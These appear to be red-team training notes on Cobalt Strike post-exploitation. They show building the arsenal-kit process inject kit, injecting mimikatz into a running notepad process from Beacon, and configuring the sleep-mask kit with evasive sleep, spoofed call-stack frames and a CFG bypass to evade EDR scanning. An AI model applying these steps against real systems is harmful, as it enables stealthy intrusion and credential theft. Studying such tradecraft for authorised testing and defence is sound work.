
There are plenty of post-exploitation techniques that we can employ onto Beacon, though most of them fall in the form of aggressor scripts.

The first we can utilize is the process injection kit. Rather than manually inject our post-ex capabilities into a new process (which would sometimes even require us to spawn an entirely new process), we can explicitly inject the capabilities into an already running process.

# Explicit Injection

```
attacker@DESKTOP-3BSK7NO /m/c/T/c/a/k/process_inject> ./build.sh /mnt/c/Tools/cobaltstrike/custom-injection
[Process Inject kit] [+] You have a x86_64 mingw--I will recompile the process inject beacon object files
[Process Inject kit] [*] Compile process_inject_spawn.x64.o
[Process Inject kit] [*] Compile process_inject_spawn.x86.o
[Process Inject kit] [*] Compile process_inject_explicit.x64.o
[Process Inject kit] [*] Compile process_inject_explicit.x86.o
[Process Inject kit] [+] The Process inject object files are saved in '/mnt/c/Tools/cobaltstrike/custom-injection'
```

```
beacon> ps

PID   PPID  Name                                   Arch  Session     User
---   ----  ----                                   ----  -------     ----
6080  6404  notepad.exe                            x64   2           DESKTOP-3BSK7NO\Attacker

beacon> mimikatz 6080 x64 standard::coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'
```

We can load the the process injection kit by importing the `process_inject.cna` file located in the arsenal-kit parent window, or wherever we saved it to.

# sleep-mask

We can also utilize the sleep-mask kit to push back on some of the in-memory indicators of our beacons. The sleep mask will also obfuscate its memory regions and enter a sleep cycle shortly afterwards, then waking itself up to perform deobfuscation. Since EDRs can scan our beacons while they are asleep, making the memory obfuscated during its sleep cycle would mean that it the scanners would not be able to pick up on the static IOCs produced by our beacon.

We can also enable the evasive sleep-mask before compiling the overall mask kit. We can first start by changing `EVASIVE_SLEEP` to 1 in `sleepmask.c`.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/e57/112/7e8/evasive-sleep.png)

We can then uncheck `#include "evasive_sleep.c"` and uncomment the line for `evasive_sleep_stack_spoof.c`.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/dee/19a/000/evasive-sleep-stack-spoof.png)

We can then move over to the `getFunctionOffset` to set the frame info for the Windows call stack that we would like to spoof.

```
set_frame_info(&callstack[i++], L"KernelBase", 0, 0x35936, 0, FALSE);  // DeviceIoControl+0x86
set_frame_info(&callstack[i++], L"kernel32", 0, 0x15921, 0, FALSE);    // DeviceIoControl+0x81
set_frame_info(&callstack[i++], L"kernel32", 0, 0x17344, 0, FALSE);    // BaseThreadInitThunk+0x14
set_frame_info(&callstack[i++], L"ntdll", 0, 0x526b1, 0, FALSE);       // RtlUserThreadStart+0x21
```

We can switch this with the example values that were already there, which should be under `\arsenal-kit\utils\getFunctionOffset`.

Finally, we'll enable the CFG bypass capability (effectively bypassing CF Guard, which would normally prevent binary exploitation), retaining the support functionality to prevent our beacon from crashing. This can be located with `evasive_sleep_stack_spoof.c`.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/8aa/207/086/enable-cfg-bypass.png)

We'll then build the aggressor script and load it into the script manager in Cobalt Strike. Any beacons generated hereon out will retain this sleep capability.

